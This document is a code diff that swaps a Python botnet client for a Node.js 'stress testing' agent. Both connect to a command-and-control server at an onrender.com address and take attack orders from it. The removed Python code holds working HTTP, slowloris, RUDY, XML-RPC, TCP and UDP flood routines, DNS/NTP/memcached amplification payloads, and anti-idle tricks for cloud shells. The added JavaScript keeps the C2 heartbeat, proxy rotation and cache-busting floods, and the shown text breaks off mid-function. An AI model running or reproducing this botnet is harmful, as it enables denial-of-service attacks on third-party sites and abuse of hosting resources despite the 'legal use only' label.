@@ -1,909 +1,408 @@
-import threading
-import time
-import sys
-import uuid
-import hashlib
-import os
-import socket
-import random
-import struct
-import subprocess
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse
+#!/usr/bin/env node
+/**
+ * Stress Testing Client - Node.js Agent
+ * Connects to server and executes missions on command
+ * LEGAL USE ONLY: Only test systems you own or have written permission to test
+ */
 
-try:
-    import requests
-    from requests.adapters import HTTPAdapter
-    from urllib3.util.retry import Retry
-    requests.packages.urllib3.disable_warnings()
-except ImportError:
-    print("[!] Install requests: pip install requests")
-    exit(1)
+const axios = require('axios');
+const os = require('os');
+const fs = require('fs');
 
-try:
-    import psutil
-except ImportError:
-    psutil = None
+// Configuration
+const SERVER_URL = process.env.SERVER_URL || 'https://c2-server-io.onrender.com';
+const HEARTBEAT_INTERVAL = 5000; // 5 seconds
 
+let clientId = null;
+let currentMission = null;
+let isAttacking = false;
+let requestsSent = 0;
+let requestsFailed = 0;
+let userAgents = [];
+let proxies = [];
+let currentUAIndex = 0;
+let currentProxyIndex = 0;
 
-class AntiIdleManager:
-    def __init__(self):
-        self.running = False
-        self.thread = None
-        self.environment = self.detect_environment()
-        self.idle_prevention_enabled = self.environment in ['github-codespaces', 'google-cloud-shell']
-        
-    def detect_environment(self):
-        if 'CODESPACE_NAME' in os.environ:
-            return 'github-codespaces'
-        elif 'CLOUD_SHELL' in os.environ:
-            return 'google-cloud-shell'
-        elif os.path.exists('/.dockerenv'):
-            return 'docker'
-        elif os.path.exists('/data/data/com.termux'):
-            return 'termux-android'
-        else:
-            return 'local'
-    
-    def start(self):
-        if not self.idle_prevention_enabled:
-            return
-        
-        self.running = True
-        self.thread = threading.Thread(target=self._anti_idle_worker, daemon=True)
-        self.thread.start()
-        print(f"[+] Anti-Idle Protection: ENABLED for {self.environment}")
-    
-    def stop(self):
-        self.running = False
-        if self.thread:
-            self.thread.join(timeout=2)
-    
-    def _anti_idle_worker(self):
-        idle_activities = [
-            self._touch_dummy_file,
-            self._ping_localhost,
-            self._check_disk_usage,
-            self._list_processes,
-            self._network_check
-        ]
-        
-        activity_index = 0
-        
-        while self.running:
-            try:
-                activity = idle_activities[activity_index % len(idle_activities)]
-                activity()
-                activity_index += 1
-                time.sleep(60)
-            except Exception as e:
-                time.sleep(60)
-    
-    def _touch_dummy_file(self):
-        try:
-            dummy_file = '/tmp/.bot_keepalive'
-            with open(dummy_file, 'a') as f:
-                f.write(f'{time.time()}\n')
-            if os.path.exists(dummy_file) and os.path.getsize(dummy_file) > 1024:
-                os.remove(dummy_file)
-        except:
-            pass
-    
-    def _ping_localhost(self):
-        try:
-            subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
-                         stdout=subprocess.DEVNULL, 
-                         stderr=subprocess.DEVNULL, 
-                         timeout=5)
-        except:
-            pass
-    
-    def _check_disk_usage(self):
-        try:
-            if psutil:
-                psutil.disk_usage('/')
-            else:
-                subprocess.run(['df', '-h'], 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL,
-                             timeout=5)
-        except:
-            pass
-    
-    def _list_processes(self):
-        try:
-            if psutil:
-                list(psutil.process_iter(['pid', 'name']))[:10]
-            else:
-                subprocess.run(['ps', 'aux'], 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL,
-                             timeout=5)
-        except:
-            pass
-    
-    def _network_check(self):
-        try:
-            socket.create_connection(("8.8.8.8", 53), timeout=2)
-        except:
-            pass
+// Color codes
+const colors = {
+  reset: '\x1b[0m',
+  bright: '\x1b[1m',
+  green: '\x1b[32m',
+  yellow: '\x1b[33m',
+  red: '\x1b[31m',
+  cyan: '\x1b[36m',
+  magenta: '\x1b[35m'
+};
 
+function log(message, color = 'reset') {
+  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
+  console.log(`${colors[color]}[${timestamp}] ${message}${colors.reset}`);
+}
 
-class EnhancedBot:
-    def __init__(self):
-        self.server_url = "https://c2-server-io.onrender.com"
-        
-        self.bot_id = self.generate_bot_id()
-        self.running = True
-        self.approved = False
-        self.active_attacks = []
-        self.attack_lock = threading.Lock()
-        self.connection_retries = 0
-        self.max_retry_delay = 300
-        
-        self.anti_idle = AntiIdleManager()
-        
-        self.session_pool = []
-        self.pool_size = 30
-        self.init_session_pool()
-        
-        self.specs = {
-            'bot_id': self.bot_id,
-            'cpu_cores': self.get_cpu_count(),
-            'cpu_freq': self.get_cpu_freq(),
-            'ram_gb': self.get_ram_gb(),
-            'ram_available': self.get_ram_available(),
-            'os': self.anti_idle.environment,
-            'hostname': socket.gethostname(),
-            'network_interfaces': self.get_network_info(),
-            'anti_idle_enabled': self.anti_idle.idle_prevention_enabled,
-            'capabilities': {
-                'http': True,
-                'tcp': True,
-                'udp': True,
-                'resource_optimized': True,
-                'auto_connect': True,
-                'anti_idle': True
-            }
-        }
-        
-        self.stats = {
-            'total_attacks': 0,
-            'successful_attacks': 0,
-            'total_requests': 0,
-            'uptime': time.time()
-        }
-        
-        self.display_banner()
-    
-    def init_session_pool(self):
-        for _ in range(self.pool_size):
-            session = requests.Session()
-            session.verify = False
-            
-            adapter = HTTPAdapter(
-                pool_connections=50,
-                pool_maxsize=50,
-                max_retries=0,
-                pool_block=False
-            )
-            session.mount('http://', adapter)
-            session.mount('https://', adapter)
-            
-            self.session_pool.append(session)
-    
-    def get_session(self):
-        return random.choice(self.session_pool)
-    
-    def get_cpu_count(self):
-        try:
-            if psutil:
-                return psutil.cpu_count()
-            return os.cpu_count() or 4
-        except:
-            return 4
-    
-    def get_cpu_freq(self):
-        try:
-            if psutil and psutil.cpu_freq():
-                return round(psutil.cpu_freq().max, 2)
-            return 0.0
-        except:
-            return 0.0
-    
-    def get_ram_gb(self):
-        try:
-            if psutil:
-                return round(psutil.virtual_memory().total / (1024**3), 1)
-            return 0.0
-        except:
-            return 0.0
-    
-    def get_ram_available(self):
-        try:
-            if psutil:
-                return round(psutil.virtual_memory().available / (1024**3), 1)
-            return 0.0
-        except:
-            return 0.0
-    
-    def check_internet_connection(self):
-        try:
-            socket.create_connection(("8.8.8.8", 53), timeout=3)
-            return True
-        except OSError:
-            pass
-        
-        try:
-            socket.create_connection(("www.google.com", 80), timeout=3)
-            return True
-        except OSError:
-            pass
-        
-        return False
-    
-    def wait_for_internet(self):
-        print("\n[X] No internet connection detected")
-        print("[...] Waiting for internet connection...")
-        
-        while not self.check_internet_connection():
-            print("\r[...] Checking connection...", end='')
-            time.sleep(5)
-        
-        print("\n[OK] Internet connection restored!")
-        time.sleep(2)
-        
-    def calculate_retry_delay(self):
-        delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
-        return delay
-        
-    def display_banner(self):
-        print("\n" + "="*60)
-        print("  ENHANCED BOT CLIENT v3.1 - ULTRA FAST + ANTI-IDLE")
-        print("="*60)
-        print(f"\n[+] BOT ID: {self.bot_id}")
-        print(f"[+] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
-        print(f"[+] RAM: {self.specs['ram_gb']}GB (Available: {self.specs['ram_available']}GB)")
-        print(f"[+] Environment: {self.specs['os']}")
-        print(f"[+] Session Pool: {self.pool_size} connections")
-        print(f"[+] Auto-Connect: ENABLED")
-        print(f"[+] Anti-Idle: {'ENABLED' if self.anti_idle.idle_prevention_enabled else 'DISABLED'}")
-        print(f"[+] Speed Mode: ULTRA FAST (Zero delays)")
-        print(f"[+] Server: {self.server_url}")
-        
-        print(f"\n[*] FEATURES:")
-        print(f"    [OK] ULTRA-FAST REQUESTS (NO DELAYS)")
-        print(f"    [OK] RESOURCE OPTIMIZED (50-300 threads)")
-        print(f"    [OK] MULTI-THREADED ATTACKS")
-        print(f"    [OK] CONNECTION POOLING (30 sessions)")
-        print(f"    [OK] CUSTOM USER AGENTS FROM SERVER")
-        print(f"    [OK] OPTIONAL PROXY SUPPORT")
-        print(f"    [OK] AUTO-RECONNECT ON DISCONNECT")
-        print(f"    [OK] CLOUD ENVIRONMENT COMPATIBLE")
-        if self.anti_idle.idle_prevention_enabled:
-            print(f"    [OK] ANTI-IDLE PROTECTION (Prevents timeout)")
-        
-        print("\n" + "="*60 + "\n")
-        
-    def generate_bot_id(self):
-        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
-                       for elements in range(0,2*6,2)][::-1])
-        return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
-    
-    def get_network_info(self):
-        try:
-            if psutil:
-                interfaces = []
-                for interface, addrs in psutil.net_if_addrs().items():
-                    for addr in addrs:
-                        if addr.family == socket.AF_INET:
-                            interfaces.append({
-                                'name': interface,
-                                'ip': addr.address
-                            })
-                return interfaces
-            else:
-                hostname = socket.gethostname()
-                ip = socket.gethostbyname(hostname)
-                return [{'name': 'default', 'ip': ip}]
-        except:
-            return []
-    
-    def check_cpu_usage(self):
-        if psutil:
-            try:
-                cpu_percent = psutil.cpu_percent(interval=0.5)
-                return cpu_percent < 90
-            except:
-                return True
-        return True
-    
-    def check_approval(self):
-        try:
-            data = {
-                'bot_id': self.bot_id,
-                'specs': self.specs,
-                'stats': self.stats
-            }
-            response = requests.post(
-                f"{self.server_url}/check_approval", 
-                json=data, 
-                timeout=10,
-                verify=False
-            )
-            if response.status_code == 200:
-                result = response.json()
-                self.connection_retries = 0
-                return result.get('approved', False)
-        except requests.exceptions.RequestException:
-            raise
-        except:
-            pass
-        return False
-    
-    def get_commands(self):
-        try:
-            response = requests.get(
-                f"{self.server_url}/commands/{self.bot_id}", 
-                timeout=5,
-                verify=False
-            )
-            if response.status_code == 200:
-                self.connection_retries = 0
-                return response.json().get('commands', [])
-        except requests.exceptions.RequestException:
-            raise
-        except:
-            pass
-        return []
-    
-    def send_status(self, status, message):
-        try:
-            uptime_current = int(time.time() - self.stats['uptime'])
-            
-            data = {
-                'bot_id': self.bot_id,
-                'status': status,
-                'message': message,
-                'stats': {
-                    'total_attacks': self.stats['total_attacks'],
-                    'successful_attacks': self.stats['successful_attacks'],
-                    'total_requests': self.stats['total_requests'],
-                    'uptime': uptime_current
-                },
-                'active_attacks': len(self.active_attacks)
-            }
-            requests.post(
-                f"{self.server_url}/status", 
-                json=data, 
-                timeout=5,
-                verify=False
-            )
-            self.connection_retries = 0
-        except:
-            pass
-    
-    def get_proxy_dict(self, proxy_str):
-        if not proxy_str:
-            return None
-        
-        try:
-            if '@' in proxy_str:
-                auth, address = proxy_str.split('@')
-                proxy_url = f"http://{auth}@{address}"
-            else:
-                proxy_url = f"http://{proxy_str}"
-            
-            return {
-                'http': proxy_url,
-                'https': proxy_url
-            }
-        except:
-            return None
-    
-    def execute_command(self, cmd):
-        cmd_type = cmd.get('type')
-        
-        print(f"\n{'='*60}")
-        print(f"[->] COMMAND: {cmd_type}")
-        print(f"{'='*60}")
-        
-        try:
-            if cmd_type == 'ping':
-                self.cmd_ping()
-            elif cmd_type == 'http_flood':
-                self.cmd_http_flood(cmd)
-            elif cmd_type == 'tcp_flood':
-                self.cmd_tcp_flood(cmd)
-            elif cmd_type == 'udp_flood':
-                self.cmd_udp_flood(cmd)
-            elif cmd_type == 'slowloris':
-                cmd['method'] = 'GET'
-                cmd['attack_type'] = 'SLOWLORIS'
-                self.cmd_http_flood(cmd)
-            elif cmd_type == 'wordpress_xmlrpc':
-                cmd['attack_type'] = 'XMLRPC'
-                self.cmd_http_flood(cmd)
-            elif cmd_type == 'layer7':
-                self.cmd_layer7(cmd)
-            elif cmd_type == 'sysinfo':
-                self.cmd_sysinfo()
-            elif cmd_type == 'stop_all':
-                self.cmd_stop_all()
-            else:
-                print(f"[!] Unknown command: {cmd_type}")
-                
-        except Exception as e:
-            print(f"[!] Error: {e}")
-            self.send_status('error', str(e))
-    
-    def cmd_ping(self):
-        self.send_status('success', 'pong')
-        print("[OK] Pong!")
-    
-    def cmd_http_flood(self, cmd):
-        target = cmd['target']
-        duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 100)
-        method = cmd.get('method', 'GET')
-        attack_type = cmd.get('attack_type', method)
-        user_agents = cmd.get('user_agents', [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        ])
-        proxies = cmd.get('proxies', [])
-        
-        max_threads = min(threads, 300)
-        if not self.check_cpu_usage():
-            max_threads = min(max_threads, 100)
-            print("[!] High CPU usage detected, limiting threads to 100")
-        
-        print(f"[*] HTTP {attack_type} ATTACK")
-        print(f"    Target: {target}")
-        print(f"    Duration: {duration}s")
-        print(f"    Threads: {max_threads}")
-        print(f"    User Agents: {len(user_agents)}")
-        print(f"    Proxies: {len(proxies) if proxies else 'None'}")
-        
-        self.stats['total_attacks'] += 1
-        self.send_status('running', f'{attack_type} ATTACK: {target}')
-        
-        attack_id = f"http_{int(time.time())}"
-        with self.attack_lock:
-            self.active_attacks.append(attack_id)
-        
-        request_count = [0]
-        success_count = [0]
-        
-        def flood_worker():
-            end_time = time.time() + duration
-            session = self.get_session()
-            
-            proxy_dict = None
-            if proxies:
-                proxy_str = random.choice(proxies)
-                proxy_dict = self.get_proxy_dict(proxy_str)
-            
-            while time.time() < end_time and attack_id in self.active_attacks:
-                try:
-                    headers = {
-                        'User-Agent': random.choice(user_agents),
-                        'Accept': '*/*',
-                        'Connection': 'keep-alive',
-                        'Cache-Control': 'no-cache'
-                    }
-                    
-                    if attack_type == 'GET':
-                        params = {
-                            '_': str(int(time.time() * 1000000)),
-                            'r': random.randint(1, 9999999)
-                        }
-                        r = session.get(target, headers=headers, params=params, 
-                                      timeout=3, verify=False, proxies=proxy_dict)
-                    
-                    elif attack_type == 'POST':
-                        payload = {'data': 'x' * random.randint(100, 1000)}
-                        r = session.post(target, headers=headers, data=payload, 
-                                       timeout=3, verify=False, proxies=proxy_dict)
-                    
-                    elif attack_type == 'HEAD':
-                        params = {'_': str(int(time.time() * 1000000))}
-                        r = session.head(target, headers=headers, params=params, 
-                                       timeout=3, verify=False, proxies=proxy_dict)
-                    
-                    elif attack_type == 'SLOWLORIS':
-                        headers['X-a'] = str(random.randint(1, 9999))
-                        r = session.get(target, headers=headers, timeout=30, 
-                                      verify=False, proxies=proxy_dict, stream=True)
-                        time.sleep(10)
-                    
-                    elif attack_type == 'BYPASS':
-                        bypass_headers = headers.copy()
-                        bypass_headers.update({
-                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-                            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-                            'Pragma': 'no-cache'
-                        })
-                        params = {'cache': random.randint(1, 999999)}
-                        r = session.get(target, headers=bypass_headers, params=params,
-                                      timeout=3, verify=False, proxies=proxy_dict)
-                    
-                    elif attack_type == 'XMLRPC':
-                        xml_data = f'''<?xml version="1.0"?>
-<methodCall>
-  <methodName>pingback.ping</methodName>
-  <params>
-    <param><value><string>{target}</string></value></param>
-    <param><value><string>{target}</string></value></param>
-  </params>
-</methodCall>'''
-                        headers['Content-Type'] = 'text/xml'
-                        xmlrpc_target = target if '/xmlrpc.php' in target else target.rstrip('/') + '/xmlrpc.php'
-                        r = session.post(xmlrpc_target, headers=headers, 
-                                       data=xml_data, timeout=3, verify=False, proxies=proxy_dict)
-                    
-                    elif attack_type == 'RUDY':
-                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
-                        headers['Content-Length'] = '1000000'
-                        r = session.post(target, headers=headers, data='A'*100,
-                                       timeout=30, verify=False, proxies=proxy_dict)
-                        time.sleep(5)
-                    
-                    else:
-                        r = session.get(target, headers=headers, timeout=3, 
-                                      verify=False, proxies=proxy_dict)
-                    
-                    request_count[0] += 1
-                    if r.status_code < 500:
-                        success_count[0] += 1
-                    
-                except:
-                    request_count[0] += 1
-        
-        print(f"[+] Launching {max_threads} attack threads...")
-        
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            futures = [executor.submit(flood_worker) for _ in range(max_threads)]
-            
-            start = time.time()
-            last_count = 0
-            
-            while time.time() - start < duration and attack_id in self.active_attacks:
-                time.sleep(1)
-                elapsed = time.time() - start
-                
-                current = request_count[0]
-                rps = (current - last_count)
-                avg_rps = current / elapsed if elapsed > 0 else 0
-                
-                print(f"\r[>>] Total: {current:,} | "
-                      f"RPS: {rps:,} | "
-                      f"Avg: {avg_rps:.0f} | "
-                      f"Success: {success_count[0]:,}", end='')
-                
-                last_count = current
-            
-            with self.attack_lock:
-                if attack_id in self.active_attacks:
-                    self.active_attacks.remove(attack_id)
-        
-        print(f"\n[OK] {attack_type} ATTACK COMPLETE: {request_count[0]:,} requests sent!")
-        self.stats['total_requests'] += request_count[0]
-        self.stats['successful_attacks'] += 1
-        self.send_status('success', f'{attack_type}: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
-    
-    def cmd_tcp_flood(self, cmd):
-        target = cmd['target']
-        duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 75)
-        attack_type = cmd.get('attack_type', 'CONNECT')
-        
-        max_threads = min(threads, 200)
-        if not self.check_cpu_usage():
-            max_threads = min(max_threads, 75)
-        
-        if ':' in target:
-            host, port = target.split(':')
-            port = int(port)
-        else:
-            host = target
-            port = 80
-        
-        print(f"[*] TCP {attack_type} ATTACK")
-        print(f"    Target: {host}:{port}")
-        print(f"    Duration: {duration}s")
-        print(f"    Threads: {max_threads}")
-        
-        self.stats['total_attacks'] += 1
-        self.send_status('running', f'TCP {attack_type}: {host}:{port}')
-        
-        attack_id = f"tcp_{int(time.time())}"
-        with self.attack_lock:
-            self.active_attacks.append(attack_id)
-        
-        request_count = [0]
-        
-        def tcp_worker():
-            end_time = time.time() + duration
-            
-            while time.time() < end_time and attack_id in self.active_attacks:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    
-                    if attack_type == 'SYN':
-                        sock.connect((host, port))
-                        sock.close()
-                    
-                    elif attack_type == 'ACK':
-                        sock.connect((host, port))
-                        sock.send(b'\x00' * 256)
-                        sock.close()
-                    
-                    elif attack_type == 'FIN':
-                        sock.connect((host, port))
-                        sock.shutdown(socket.SHUT_WR)
-                        sock.close()
-                    
-                    else:
-                        sock.connect((host, port))
-                        payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
-                        sock.send(payload)
-                        sock.close()
-                    
-                    request_count[0] += 1
-                except:
-                    request_count[0] += 1
-        
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            futures = [executor.submit(tcp_worker) for _ in range(max_threads)]
-            
-            start = time.time()
-            while time.time() - start < duration:
-                time.sleep(1)
-                print(f"\r[>>] TCP Connections: {request_count[0]:,}", end='')
-            
-            with self.attack_lock:
-                if attack_id in self.active_attacks:
-                    self.active_attacks.remove(attack_id)
-        
-        print(f"\n[OK] TCP {attack_type}: {request_count[0]:,} connections")
-        self.stats['total_requests'] += request_count[0]
-        self.stats['successful_attacks'] += 1
-        self.send_status('success', f'TCP {attack_type}: {request_count[0]:,} conn')
-    
-    def cmd_udp_flood(self, cmd):
-        target = cmd['target']
-        duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 75)
-        attack_type = cmd.get('attack_type', 'FLOOD')
-        
-        max_threads = min(threads, 200)
-        if not self.check_cpu_usage():
-            max_threads = min(max_threads, 75)
-        
-        if ':' in target:
-            host, port = target.split(':')
-            port = int(port)
-        else:
-            host = target
-            port = 53
-        
-        print(f"[*] UDP {attack_type} ATTACK")
-        print(f"    Target: {host}:{port}")
-        print(f"    Duration: {duration}s")
-        print(f"    Threads: {max_threads}")
-        
-        self.stats['total_attacks'] += 1
-        self.send_status('running', f'UDP {attack_type}: {host}:{port}')
-        
-        attack_id = f"udp_{int(time.time())}"
-        with self.attack_lock:
-            self.active_attacks.append(attack_id)
-        
-        request_count = [0]
-        
-        def udp_worker():
-            end_time = time.time() + duration
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            
-            while time.time() < end_time and attack_id in self.active_attacks:
-                try:
-                    if attack_type == 'DNS':
-                        payload = b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(50)
-                    
-                    elif attack_type == 'NTP':
-                        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
-                    
-                    elif attack_type == 'MEMCACHED':
-                        payload = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
-                    
-                    else:
-                        payload = os.urandom(random.randint(512, 2048))
-                    
-                    sock.sendto(payload, (host, port))
-                    request_count[0] += 1
-                except:
-                    pass
-            
-            sock.close()
-        
-        with ThreadPoolExecutor(max_workers=max_threads) as executor:
-            futures = [executor.submit(udp_worker) for _ in range(max_threads)]
-            
-            start = time.time()
-            while time.time() - start < duration:
-                time.sleep(1)
-                print(f"\r[>>] UDP Packets: {request_count[0]:,}", end='')
-            
-            with self.attack_lock:
-                if attack_id in self.active_attacks:
-                    self.active_attacks.remove(attack_id)
-        
-        print(f"\n[OK] UDP {attack_type}: {request_count[0]:,} packets")
-        self.stats['total_requests'] += request_count[0]
-        self.stats['successful_attacks'] += 1
-        self.send_status('success', f'UDP {attack_type}: {request_count[0]:,} packets')
-    
-    def cmd_layer7(self, cmd):
-        attack_type = cmd.get('attack_type', 'BROWSER')
-        
-        if attack_type in ['BROWSER', 'API', 'SEARCH', 'LOGIN']:
-            self.cmd_http_flood(cmd)
-        else:
-            self.cmd_http_flood(cmd)
-    
-    def cmd_sysinfo(self):
-        info_lines = []
-        
-        if psutil:
-            try:
-                cpu_percent = psutil.cpu_percent(interval=1)
-                mem = psutil.virtual_memory()
-                info_lines.append(f"CPU: {cpu_percent}%")
-                info_lines.append(f"RAM: {mem.percent}% ({mem.used/(1024**3):.1f}GB/{mem.total/(1024**3):.1f}GB)")
-            except:
-                info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
-        else:
-            info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
-        
-        info_lines.append(f"Environment: {self.specs['os']}")
-        info_lines.append(f"Anti-Idle: {'ON' if self.anti_idle.idle_prevention_enabled else 'OFF'}")
-        info_lines.append(f"Active Attacks: {len(self.active_attacks)}")
-        info_lines.append(f"Total Attacks: {self.stats['total_attacks']}")
-        info_lines.append(f"Total Requests: {self.stats['total_requests']:,}")
-        
-        info = '\n'.join(info_lines)
-        print(f"[*] System Info:\n{info}")
-        self.send_status('success', info)
-    
-    def cmd_stop_all(self):
-        print(f"[!] Stopping all attacks...")
-        
-        with self.attack_lock:
-            count = len(self.active_attacks)
-            self.active_attacks.clear()
-        
-        print(f"[OK] Stopped {count} attacks")
-        self.send_status('success', f'Stopped {count}')
-    
-    def run(self):
-        self.anti_idle.start()
-        
-        while self.running:
-            try:
-                if not self.check_internet_connection():
-                    self.wait_for_internet()
-                    self.connection_retries = 0
-                
-                print(f"\n[*] Connecting to server: {self.server_url}")
-                print(f"[*] Waiting for auto-approval...\n")
-                
-                self.approved = False
-                
-                while not self.approved:
-                    try:
-                        if not self.check_internet_connection():
-                            self.wait_for_internet()
-                            continue
-                        
-                        if self.check_approval():
-                            self.approved = True
-                            print("\n" + "="*60)
-                            print("  BOT APPROVED! READY FOR OPERATIONS")
-                            print("="*60 + "\n")
-                            break
-                        else:
-                            print(f"[...] Waiting for approval (ID: {self.bot_id})...", end='\r')
-                            time.sleep(5)
-                            
-                    except requests.exceptions.RequestException as e:
-                        self.connection_retries += 1
-                        delay = self.calculate_retry_delay()
-                        
-                        print(f"\n[X] Connection lost: {type(e).__name__}")
-                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
-                        
-                        for remaining in range(delay, 0, -1):
-                            if not self.check_internet_connection():
-                                self.wait_for_internet()
-                                break
-                            print(f"\r[...] Reconnecting in {remaining}s", end='')
-                            time.sleep(1)
-                        
-                        print(f"\n[->] Attempting to reconnect...")
-                        
-                    except KeyboardInterrupt:
-                        print("\n[!] Exiting...")
-                        self.anti_idle.stop()
-                        return
-                    except Exception as e:
-                        print(f"\n[!] Error: {e}")
-                        time.sleep(10)
-                
-                print(f"[+] Active. Listening for commands...\n")
-                
-                while self.running and self.approved:
-                    try:
-                        if not self.check_internet_connection():
-                            print(f"\n[X] Internet connection lost")
-                            self.wait_for_internet()
-                            self.approved = False
-                            break
-                        
-                        commands = self.get_commands()
-                        for cmd in commands:
-                            threading.Thread(target=self.execute_command, args=(cmd,), daemon=True).start()
-                        
-                        time.sleep(5)
-                        
-                    except requests.exceptions.RequestException as e:
-                        self.connection_retries += 1
-                        delay = self.calculate_retry_delay()
-                        
-                        print(f"\n[X] Lost connection to C2 server: {type(e).__name__}")
-                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s...")
-                        
-                        for remaining in range(delay, 0, -1):
-                            if not self.check_internet_connection():
-                                self.wait_for_internet()
-                                break
-                            print(f"\r[...] Reconnecting in {remaining}s", end='')
-                            time.sleep(1)
-                        
-                        print(f"\n[->] Attempting to reconnect...")
-                        self.approved = False
-                        break
-                        
-                    except KeyboardInterrupt:
-                        print("\n[!] Stopping...")
-                        self.cmd_stop_all()
-                        self.anti_idle.stop()
-                        self.running = False
-                        return
-                        
-                    except Exception as e:
-                        print(f"\n[!] Error: {e}")
-                        time.sleep(10)
-                
-            except KeyboardInterrupt:
-                print("\n[!] Exiting...")
-                self.anti_idle.stop()
-                self.running = False
-                return
+function loadUserAgents() {
+  try {
+    if (fs.existsSync('useragent.txt')) {
+      const data = fs.readFileSync('useragent.txt', 'utf8');
+      userAgents = data.split('\n').filter(line => line.trim());
+      log(`✓ Loaded ${userAgents.length} user agents`, 'green');
+    } else {
+      userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
+      log('⚠ useragent.txt not found, using default', 'yellow');
+    }
+  } catch (err) {
+    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
+    log('⚠ Error loading user agents, using default', 'yellow');
+  }
+}
 
+function loadProxies() {
+  try {
+    if (fs.existsSync('proxy.txt')) {
+      const data = fs.readFileSync('proxy.txt', 'utf8');
+      proxies = data.split('\n').filter(line => line.trim());
+      log(`✓ Loaded ${proxies.length} proxies`, 'green');
+    } else {
+      log('⚠ proxy.txt not found, no proxies loaded', 'yellow');
+    }
+  } catch (err) {
+    log('⚠ Error loading proxies', 'yellow');
+  }
+}
 
-if __name__ == '__main__':
-    print("\n" + "="*60)
-    print("  ENHANCED BOT CLIENT - ULTRA FAST + ANTI-IDLE")
-    print("="*60)
+function getRandomUA() {
+  if (userAgents.length === 0) return 'Mozilla/5.0';
+  currentUAIndex = (currentUAIndex + 1) % userAgents.length;
+  return userAgents[currentUAIndex];
+}
+
+function getRandomProxy() {
+  if (proxies.length === 0) return null;
+  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+  return proxies[currentProxyIndex];
+}
+
+async function registerWithServer() {
+  try {
+    const response = await axios.post(`${SERVER_URL}/api/client/register`, {
+      hostname: os.hostname(),
+      platform: `${os.platform()} ${os.arch()}`
+    });
     
-    try:
-        client = EnhancedBot()
-        client.run()
-    except KeyboardInterrupt:
-        print("\n[!] Exiting...")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n[!] Fatal error: {e}")
-        sys.exit(1)
+    clientId = response.data.client_id;
+    log(`✓ Registered with server as: ${clientId}`, 'green');
+    return true;
+  } catch (error) {
+    log(`✗ Failed to register: ${error.message}`, 'red');
+    return false;
+  }
+}
+
+async function sendHeartbeat() {
+  if (!clientId) return;
+  
+  try {
+    const response = await axios.post(`${SERVER_URL}/api/client/heartbeat/${clientId}`, {
+      requests_sent: requestsSent,
+      requests_failed: requestsFailed
+    });
+    
+    // Check if server sent us a mission
+    if (response.data.mission && !isAttacking) {
+      currentMission = response.data.mission;
+      requestsSent = 0;
+      requestsFailed = 0;
+      
+      log(`📬 Received new mission: ${currentMission.mission_id}`, 'yellow');
+      log(`   Target: ${currentMission.target_url}`, 'cyan');
+      log(`   Method: ${currentMission.method}`, 'cyan');
+      log(`   Duration: ${currentMission.duration}s`, 'cyan');
+      
+      // Execute mission
+      executeMission(currentMission);
+    }
+    
+    // Check if mission should be stopped
+    if (response.data.mission && response.data.mission.stopped && isAttacking) {
+      log('⛔ Stop signal received from server!', 'red');
+      if (currentMission) {
+        currentMission.stopped = true;
+      }
+    }
+  } catch (error) {
+    log(`✗ Heartbeat failed: ${error.message}`, 'red');
+  }
+}
+
+async function makeRequest(url, method, payload, headers) {
+  const startTime = Date.now();
+  
+  try {
+    const proxy = getRandomProxy();
+    const config = {
+      headers: {
+        'User-Agent': getRandomUA(),
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'keep-alive',
+        'Cache-Control': 'no-cache',
+        ...headers
+      },
+      timeout: 3000,
+      maxRedirects: 5,
+      validateStatus: () => true
+    };
+    
+    // Add proxy if available
+    if (proxy) {
+      const proxyParts = proxy.split(':');
+      config.proxy = {
+        host: proxyParts[0],
+        port: parseInt(proxyParts[1]) || 8080
+      };
+      if (proxyParts[2] && proxyParts[3]) {
+        config.proxy.auth = {
+          username: proxyParts[2],
+          password: proxyParts[3]
+        };
+      }
+    }
+    
+    let response;
+    
+    // Handle different attack methods
+    switch (method.toUpperCase()) {
+      case 'HTTP-GET':
+        // Add cache bypass
+        const cacheBuster = `?cb=${Date.now()}&r=${Math.random()}`;
+        response = await axios.get(url + cacheBuster, config);
+        break;
+        
+      case 'HTTP-POST':
+        response = await axios.post(url, payload || { data: 'x'.repeat(1024) }, config);
+        break;
+        
+      case 'HTTP-SLOWLORIS':
+        // Slow header sending (simulate)
